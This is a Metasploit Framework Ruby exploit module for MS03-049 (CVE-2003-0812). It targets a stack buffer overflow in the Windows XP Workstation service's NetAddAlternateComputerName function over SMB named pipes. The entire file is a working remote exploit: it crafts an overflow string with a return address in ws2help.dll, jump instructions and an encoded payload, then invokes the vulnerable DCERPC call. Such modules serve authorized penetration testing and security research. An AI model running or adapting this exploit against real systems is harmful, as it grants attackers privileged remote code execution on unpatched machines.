##
# $Id: ms03_049_netapi.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Workstation Service NetAddAlternateComputerName Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the NetApi32 NetAddAlternateComputerName
				function using the Workstation service in Windows XP.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2003-0812' ],
					[ 'OSVDB', '11461' ],
					[ 'BID', '9011' ],
					[ 'MSB', 'MS03-049' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' =>  "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c" + [*(0x80..0x9f)].pack('C*'),
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'DefaultTarget'  => 0,
			'Targets'        =>
				[
					[ 'Windows XP SP0/SP1',
						{
							'Ret' => 0x71aa32ad # pop/pop/ret in ws2help.dll
						}
					],
				],
			'DisclosureDate' => 'Nov 11 2003'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (BROWSER, WKSSVC)", 'BROWSER']),
			], self.class)
	end

	def exploit

		connect()
		smb_login()

		handle = dcerpc_handle(
			'6bffd098-a112-3610-9833-46c3f87e345a', '1.0',
			'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
		)

		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		print_status("Building the stub data...")


		name = rand_text_alphanumeric(5000)
		name[3496, 4] = [target.ret].pack('V')
		name[3492, 2] = "\xeb\x06"
		name[3500, 5] = "\xe9" + [-3505].pack('V')
		name[0, payload.encoded.length] = payload.encoded

		stub =
			NDR.long(rand(0xffffffff)) +
			NDR.UnicodeConformantVaryingString("\\\\#{datastore['RHOST']}") +
			NDR.long(rand(0xffffffff)) +
			NDR.UnicodeConformantVaryingString(name) +
			NDR.long(rand(0xffffffff)) +
			NDR.UnicodeConformantVaryingString('') +
			NDR.long(0) +
			NDR.long(0)

		print_status("Calling the vulnerable function...")

		begin
			dcerpc.call(0x1b, stub)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
		rescue => e
			if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
				raise e
			end
		end

		# Cleanup
		handler
		disconnect
	end

end
